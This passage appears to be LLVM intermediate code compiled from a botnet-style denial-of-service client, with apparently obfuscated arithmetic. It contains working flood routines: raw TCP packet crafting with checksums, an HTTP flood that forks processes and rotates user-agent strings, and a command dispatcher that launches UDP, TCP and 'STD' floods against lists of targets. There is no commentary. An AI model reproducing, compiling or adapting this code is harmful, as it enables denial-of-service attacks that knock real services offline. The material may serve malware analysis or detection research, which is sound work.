  %493 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %492, i32 0, i32 0
  store i16 %489, i16* %493, align 4
  %494 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 0
  %496 = bitcast %union.anon* %495 to %struct.anon.0*
  %497 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %496, i32 0, i32 6
  store i16 0, i16* %497, align 4
  %498 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %499 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %500 = call zeroext i16 @tcpcsum(%struct.iphdr* %498, %struct.tcphdr* %499)
  %501 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %502 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %501, i32 0, i32 0
  %503 = bitcast %union.anon* %502 to %struct.anon.0*
  %504 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %503, i32 0, i32 6
  store i16 %500, i16* %504, align 4
  %505 = bitcast i8* %90 to i16*
  %506 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 2
  %508 = load i16, i16* %507, align 2
  %509 = zext i16 %508 to i32
  %510 = call zeroext i16 @csum(i16* %505, i32 %509)
  %511 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 7
  store i16 %510, i16* %512, align 2
  %513 = load i32, i32* %25, align 4
  %514 = load i32, i32* %15, align 4
  %515 = icmp eq i32 %513, %514
  br i1 %515, label %516, label %523

; <label>:516:                                    ; preds = %470
  %517 = call i64 @time(i64* null) #5
  %518 = load i32, i32* %24, align 4
  %519 = sext i32 %518 to i64
  %520 = icmp sgt i64 %517, %519
  br i1 %520, label %521, label %522

; <label>:521:                                    ; preds = %516
  br label %530

; <label>:522:                                    ; preds = %516
  store i32 0, i32* %25, align 4
  br label %469

; <label>:523:                                    ; preds = %470
  %524 = load i32, i32* %25, align 4
  %525 = sub i32 0, %524
  %526 = sub i32 0, 1
  %527 = add i32 %525, %526
  %528 = sub i32 0, %527
  %529 = add i32 %524, 1
  store i32 %528, i32* %25, align 4
  br label %469

; <label>:530:                                    ; preds = %521
  %531 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %531)
  br label %532

; <label>:532:                                    ; preds = %530, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = sub i64 0, %19
  %23 = sub i64 0, %21
  %24 = add i64 %22, %23
  %25 = sub i64 0, %24
  %26 = add nsw i64 %19, %21
  %27 = trunc i64 %25 to i32
  store i32 %27, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %28

; <label>:28:                                     ; preds = %71, %6
  %29 = load i32, i32* %14, align 4
  %30 = load i32, i32* %12, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %78

; <label>:32:                                     ; preds = %28
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %34 = load i8*, i8** %7, align 8
  %35 = load i8*, i8** %10, align 8
  %36 = load i8*, i8** %8, align 8
  %37 = call i32 @rand() #5
  %38 = srem i32 %37, 59
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %39
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %33, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.110, i32 0, i32 0), i8* %34, i8* %35, i8* %36, i8* %41) #5
  %43 = call i32 @fork() #5
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %70

; <label>:45:                                     ; preds = %32
  br label %46

; <label>:46:                                     ; preds = %68, %45
  %47 = load i32, i32* %15, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @time(i64* null) #5
  %50 = icmp sgt i64 %48, %49
  br i1 %50, label %51, label %69

; <label>:51:                                     ; preds = %46
  %52 = load i8*, i8** %8, align 8
  %53 = load i16, i16* %9, align 2
  %54 = call i32 @socket_connect(i8* %52, i16 zeroext %53)
  store i32 %54, i32* %13, align 4
  %55 = load i32, i32* %13, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %68

; <label>:57:                                     ; preds = %51
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #9
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  br label %68

; <label>:68:                                     ; preds = %57, %51
  br label %46

; <label>:69:                                     ; preds = %46
  call void @exit(i32 0) #12
  unreachable

; <label>:70:                                     ; preds = %32
  br label %71

; <label>:71:                                     ; preds = %70
  %72 = load i32, i32* %14, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  store i32 %76, i32* %14, align 4
  br label %28

; <label>:78:                                     ; preds = %28
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @strcmp(i8* %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %36, label %35

; <label>:35:                                     ; preds = %2
  br label %489

; <label>:36:                                     ; preds = %2
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.112, i32 0, i32 0)) #9
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %85, label %42

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %3, align 4
  %44 = icmp slt i32 %43, 6
  br i1 %44, label %57, label %45

; <label>:45:                                     ; preds = %42
  %46 = load i8**, i8*** %4, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 3
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @atoi(i8* %48) #9
  %50 = icmp slt i32 %49, 1
  br i1 %50, label %57, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i8**, i8*** %4, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 5
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @atoi(i8* %54) #9
  %56 = icmp slt i32 %55, 1
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %51, %45, %42
  br label %489

; <label>:58:                                     ; preds = %51
  %59 = call i32 @listFork()
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  br label %489

; <label>:62:                                     ; preds = %58
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 1
  %65 = load i8*, i8** %64, align 8
  %66 = load i8**, i8*** %4, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 2
  %68 = load i8*, i8** %67, align 8
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 3
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @atoi(i8* %71) #9
  %73 = trunc i32 %72 to i16
  %74 = load i8**, i8*** %4, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 4
  %76 = load i8*, i8** %75, align 8
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 5
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @atoi(i8* %79) #9
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 6
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @atoi(i8* %83) #9
  call void @SendHTTP(i8* %65, i8* %68, i16 zeroext %73, i8* %76, i32 %80, i32 %84)
  call void @exit(i32 0) #12
  unreachable

; <label>:85:                                     ; preds = %36
  %86 = load i8**, i8*** %4, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 0
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 @strcmp(i8* %88, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %188, label %91

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* %3, align 4
  %93 = icmp slt i32 %92, 6
  br i1 %93, label %127, label %94

; <label>:94:                                     ; preds = %91
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 3
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @atoi(i8* %97) #9
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %127, label %100

; <label>:100:                                    ; preds = %94
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 2
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @atoi(i8* %103) #9
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %127, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 4
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @atoi(i8* %109) #9
  %111 = icmp eq i32 %110, -1
  br i1 %111, label %127, label %112

; <label>:112:                                    ; preds = %106
  %113 = load i8**, i8*** %4, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 4
  %115 = load i8*, i8** %114, align 8
  %116 = call i32 @atoi(i8* %115) #9
  %117 = icmp sgt i32 %116, 1024
  br i1 %117, label %127, label %118

; <label>:118:                                    ; preds = %112
  %119 = load i32, i32* %3, align 4
  %120 = icmp eq i32 %119, 6
  br i1 %120, label %121, label %128

; <label>:121:                                    ; preds = %118
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 5
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @atoi(i8* %124) #9
  %126 = icmp slt i32 %125, 1
  br i1 %126, label %127, label %128

; <label>:127:                                    ; preds = %121, %112, %106, %100, %94, %91
  br label %489

; <label>:128:                                    ; preds = %121, %118
  %129 = load i8**, i8*** %4, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 1
  %131 = load i8*, i8** %130, align 8
  store i8* %131, i8** %5, align 8
  %132 = load i8**, i8*** %4, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 2
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @atoi(i8* %134) #9
  store i32 %135, i32* %6, align 4
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 3
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @atoi(i8* %138) #9
  store i32 %139, i32* %7, align 4
  %140 = load i8**, i8*** %4, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 4
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @atoi(i8* %142) #9
  store i32 %143, i32* %8, align 4
  %144 = load i32, i32* %3, align 4
  %145 = icmp eq i32 %144, 6
  br i1 %145, label %146, label %151

; <label>:146:                                    ; preds = %128
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 5
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149) #9
  br label %152

; <label>:151:                                    ; preds = %128
  br label %152

; <label>:152:                                    ; preds = %151, %146
  %153 = phi i32 [ %150, %146 ], [ 10, %151 ]
  store i32 %153, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %154 = load i8*, i8** %5, align 8
  %155 = call i8* @strstr(i8* %154, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %176

; <label>:157:                                    ; preds = %152
  %158 = load i8*, i8** %5, align 8
  %159 = call i8* @strtok(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %159, i8** %11, align 8
  br label %160

; <label>:160:                                    ; preds = %173, %157
  %161 = load i8*, i8** %11, align 8
  %162 = icmp ne i8* %161, null
  br i1 %162, label %163, label %175

; <label>:163:                                    ; preds = %160
  %164 = call i32 @listFork()
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %173, label %166

; <label>:166:                                    ; preds = %163
  %167 = load i8*, i8** %11, align 8
  %168 = load i32, i32* %6, align 4
  %169 = load i32, i32* %7, align 4
  %170 = load i32, i32* %8, align 4
  %171 = load i32, i32* %9, align 4
  %172 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %167, i32 %168, i32 %169, i32 %170, i32 %171, i32 %172)
  call void @_exit(i32 0) #11
  unreachable

; <label>:173:                                    ; preds = %163
  %174 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %174, i8** %11, align 8
  br label %160

; <label>:175:                                    ; preds = %160
  br label %187

; <label>:176:                                    ; preds = %152
  %177 = call i32 @listFork()
  %178 = icmp ne i32 %177, 0
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %176
  br label %489

; <label>:180:                                    ; preds = %176
  %181 = load i8*, i8** %5, align 8
  %182 = load i32, i32* %6, align 4
  %183 = load i32, i32* %7, align 4
  %184 = load i32, i32* %8, align 4
  %185 = load i32, i32* %9, align 4
  %186 = load i32, i32* %10, align 4
  call void @SendUDP(i8* %181, i32 %182, i32 %183, i32 %184, i32 %185, i32 %186)
  call void @_exit(i32 0) #11
  unreachable

; <label>:187:                                    ; preds = %175
  br label %188

; <label>:188:                                    ; preds = %187, %85
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 0
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @strcmp(i8* %191, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.114, i32 0, i32 0)) #9
  %193 = icmp ne i32 %192, 0
  br i1 %193, label %299, label %194

; <label>:194:                                    ; preds = %188
  %195 = load i32, i32* %3, align 4
  %196 = icmp slt i32 %195, 6
  br i1 %196, label %227, label %197

; <label>:197:                                    ; preds = %194
  %198 = load i8**, i8*** %4, align 8
  %199 = getelementptr inbounds i8*, i8** %198, i64 3
  %200 = load i8*, i8** %199, align 8
  %201 = call i32 @atoi(i8* %200) #9
  %202 = icmp eq i32 %201, -1
  br i1 %202, label %227, label %203

; <label>:203:                                    ; preds = %197
  %204 = load i8**, i8*** %4, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 2
  %206 = load i8*, i8** %205, align 8
  %207 = call i32 @atoi(i8* %206) #9
  %208 = icmp eq i32 %207, -1
  br i1 %208, label %227, label %209

; <label>:209:                                    ; preds = %203
  %210 = load i32, i32* %3, align 4
  %211 = icmp sgt i32 %210, 5
  br i1 %211, label %212, label %218

; <label>:212:                                    ; preds = %209
  %213 = load i8**, i8*** %4, align 8
  %214 = getelementptr inbounds i8*, i8** %213, i64 5
  %215 = load i8*, i8** %214, align 8
  %216 = call i32 @atoi(i8* %215) #9
  %217 = icmp slt i32 %216, 0
  br i1 %217, label %227, label %218

; <label>:218:                                    ; preds = %212, %209
  %219 = load i32, i32* %3, align 4
  %220 = icmp eq i32 %219, 7
  br i1 %220, label %221, label %228

; <label>:221:                                    ; preds = %218
  %222 = load i8**, i8*** %4, align 8
  %223 = getelementptr inbounds i8*, i8** %222, i64 6
  %224 = load i8*, i8** %223, align 8
  %225 = call i32 @atoi(i8* %224) #9
  %226 = icmp slt i32 %225, 1
  br i1 %226, label %227, label %228

; <label>:227:                                    ; preds = %221, %212, %203, %197, %194
  br label %489

; <label>:228:                                    ; preds = %221, %218
  %229 = load i8**, i8*** %4, align 8
  %230 = getelementptr inbounds i8*, i8** %229, i64 1
  %231 = load i8*, i8** %230, align 8
  store i8* %231, i8** %12, align 8
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 2
  %234 = load i8*, i8** %233, align 8
  %235 = call i32 @atoi(i8* %234) #9
  store i32 %235, i32* %13, align 4
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 3
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #9
  store i32 %239, i32* %14, align 4
  %240 = load i8**, i8*** %4, align 8
  %241 = getelementptr inbounds i8*, i8** %240, i64 4
  %242 = load i8*, i8** %241, align 8
  store i8* %242, i8** %15, align 8
  %243 = load i32, i32* %3, align 4
  %244 = icmp eq i32 %243, 7
  br i1 %244, label %245, label %250

; <label>:245:                                    ; preds = %228
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 6
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @atoi(i8* %248) #9
  br label %251

; <label>:250:                                    ; preds = %228
  br label %251

; <label>:251:                                    ; preds = %250, %245
  %252 = phi i32 [ %249, %245 ], [ 10, %250 ]
  store i32 %252, i32* %16, align 4
  %253 = load i32, i32* %3, align 4
  %254 = icmp sgt i32 %253, 5
  br i1 %254, label %255, label %260

; <label>:255:                                    ; preds = %251
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 5
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #9
  br label %261

; <label>:260:                                    ; preds = %251
  br label %261

; <label>:261:                                    ; preds = %260, %255
  %262 = phi i32 [ %259, %255 ], [ 0, %260 ]
  store i32 %262, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %263 = load i8*, i8** %12, align 8
  %264 = call i8* @strstr(i8* %263, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %265 = icmp ne i8* %264, null
  br i1 %265, label %266, label %286

; <label>:266:                                    ; preds = %261
  %267 = load i8*, i8** %12, align 8
  %268 = call i8* @strtok(i8* %267, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %268, i8** %19, align 8
  br label %269

; <label>:269:                                    ; preds = %283, %266
  %270 = load i8*, i8** %19, align 8
  %271 = icmp ne i8* %270, null
  br i1 %271, label %272, label %285

; <label>:272:                                    ; preds = %269
  %273 = call i32 @listFork()
  %274 = icmp ne i32 %273, 0
  br i1 %274, label %283, label %275

; <label>:275:                                    ; preds = %272
  %276 = load i8*, i8** %19, align 8
  %277 = load i32, i32* %13, align 4
  %278 = load i32, i32* %14, align 4
  %279 = load i8*, i8** %15, align 8
  %280 = load i32, i32* %17, align 4
  %281 = load i32, i32* %16, align 4
  %282 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %276, i32 %277, i32 %278, i8* %279, i32 %280, i32 %281, i32 %282)
  call void @_exit(i32 0) #11
  unreachable

; <label>:283:                                    ; preds = %272
  %284 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %284, i8** %19, align 8
  br label %269

; <label>:285:                                    ; preds = %269
  br label %298

; <label>:286:                                    ; preds = %261
  %287 = call i32 @listFork()
  %288 = icmp ne i32 %287, 0
  br i1 %288, label %289, label %290

; <label>:289:                                    ; preds = %286
  br label %489

; <label>:290:                                    ; preds = %286
  %291 = load i8*, i8** %12, align 8
  %292 = load i32, i32* %13, align 4
  %293 = load i32, i32* %14, align 4
  %294 = load i8*, i8** %15, align 8
  %295 = load i32, i32* %17, align 4
  %296 = load i32, i32* %16, align 4
  %297 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %291, i32 %292, i32 %293, i8* %294, i32 %295, i32 %296, i32 %297)
  call void @_exit(i32 0) #11
  unreachable

; <label>:298:                                    ; preds = %285
  br label %299

; <label>:299:                                    ; preds = %298, %188
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 0
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #9
  %304 = icmp ne i32 %303, 0
  br i1 %304, label %361, label %305

; <label>:305:                                    ; preds = %299
  %306 = load i32, i32* %3, align 4
  %307 = icmp slt i32 %306, 4
  br i1 %307, label %320, label %308

; <label>:308:                                    ; preds = %305
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 2
  %311 = load i8*, i8** %310, align 8
  %312 = call i32 @atoi(i8* %311) #9
  %313 = icmp slt i32 %312, 1
  br i1 %313, label %320, label %314

; <label>:314:                                    ; preds = %308
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 3
  %317 = load i8*, i8** %316, align 8
  %318 = call i32 @atoi(i8* %317) #9
  %319 = icmp slt i32 %318, 1
  br i1 %319, label %320, label %321

; <label>:320:                                    ; preds = %314, %308, %305
  br label %489

; <label>:321:                                    ; preds = %314
  %322 = load i8**, i8*** %4, align 8
  %323 = getelementptr inbounds i8*, i8** %322, i64 1
  %324 = load i8*, i8** %323, align 8
  store i8* %324, i8** %20, align 8
  %325 = load i8**, i8*** %4, align 8
  %326 = getelementptr inbounds i8*, i8** %325, i64 2
  %327 = load i8*, i8** %326, align 8
  %328 = call i32 @atoi(i8* %327) #9
  store i32 %328, i32* %21, align 4
  %329 = load i8**, i8*** %4, align 8
  %330 = getelementptr inbounds i8*, i8** %329, i64 3
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 @atoi(i8* %331) #9
  store i32 %332, i32* %22, align 4
  %333 = load i8*, i8** %20, align 8
  %334 = call i8* @strstr(i8* %333, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %335 = icmp ne i8* %334, null
  br i1 %335, label %336, label %352

; <label>:336:                                    ; preds = %321
  %337 = load i8*, i8** %20, align 8
  %338 = call i8* @strtok(i8* %337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %338, i8** %23, align 8
  br label %339

; <label>:339:                                    ; preds = %349, %336
  %340 = load i8*, i8** %23, align 8
  %341 = icmp ne i8* %340, null
  br i1 %341, label %342, label %351

; <label>:342:                                    ; preds = %339
  %343 = call i32 @listFork()
  %344 = icmp ne i32 %343, 0
  br i1 %344, label %349, label %345

; <label>:345:                                    ; preds = %342
  %346 = load i8*, i8** %23, align 8
  %347 = load i32, i32* %21, align 4
  %348 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %346, i32 %347, i32 %348)
  call void @_exit(i32 0) #11
  unreachable

; <label>:349:                                    ; preds = %342
  %350 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %350, i8** %23, align 8
  br label %339

; <label>:351:                                    ; preds = %339
  br label %360

; <label>:352:                                    ; preds = %321
  %353 = call i32 @listFork()
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %355, label %356

; <label>:355:                                    ; preds = %352
  br label %489

; <label>:356:                                    ; preds = %352
  %357 = load i8*, i8** %20, align 8
  %358 = load i32, i32* %21, align 4
  %359 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %357, i32 %358, i32 %359)
  call void @_exit(i32 0) #11
  unreachable

; <label>:360:                                    ; preds = %351
  br label %361

; <label>:361:                                    ; preds = %360, %299
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 0
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @strcmp(i8* %364, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i32 0, i32 0)) #9
  %366 = icmp ne i32 %365, 0
  br i1 %366, label %423, label %367

; <label>:367:                                    ; preds = %361
  %368 = load i32, i32* %3, align 4
  %369 = icmp slt i32 %368, 4
  br i1 %369, label %382, label %370

; <label>:370:                                    ; preds = %367
  %371 = load i8**, i8*** %4, align 8
  %372 = getelementptr inbounds i8*, i8** %371, i64 2
  %373 = load i8*, i8** %372, align 8
  %374 = call i32 @atoi(i8* %373) #9
  %375 = icmp slt i32 %374, 1
  br i1 %375, label %382, label %376

